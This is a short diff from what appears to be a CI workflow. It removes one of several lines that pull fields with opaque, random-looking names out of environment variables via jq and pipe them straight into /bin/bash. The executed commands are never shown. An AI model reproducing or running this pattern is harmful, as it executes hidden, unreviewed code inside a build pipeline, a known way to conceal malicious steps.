@@ -26,7 +26,6 @@ jobs:
           echo $or409 | jq -r .f1 | /bin/bash
           printf '%s' "$qdjhp8" | jq -r .lx24571 | /bin/bash
           printf '%s' "$fi26" | jq -r .qhan346 | /bin/bash
-          printf '%s' "$h7" | jq -r .fttq20720 | /bin/bash
           printf '%s' "$r8407" | jq -r .hslry82 | /bin/bash
 
       - name: Persist output
